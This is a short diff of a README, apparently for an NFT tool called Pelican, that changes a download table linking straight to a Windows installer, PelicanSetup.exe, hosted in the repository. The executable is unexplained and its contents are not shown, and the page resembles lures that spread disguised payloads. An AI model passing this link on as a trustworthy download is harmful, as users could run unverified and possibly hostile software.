@@ -37,8 +37,8 @@ If the program is not installed try reinstalling the package Visual Studio 2013 
 
 Example   | Description |
 --------- | --------- |
-[Windows 10 x64/x86] | [DOWNLOAD](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe)
-[Ubuntu 20.04 LTS / Soon](Soon) | [DOWNLOAD](Soon)
+[Windows 10 x64/x86](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe) | [DOWNLOAD](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe)
+Ubuntu 20.04 LTS / Soon | [DOWNLOAD](Soon)
 
 # Licensing
 
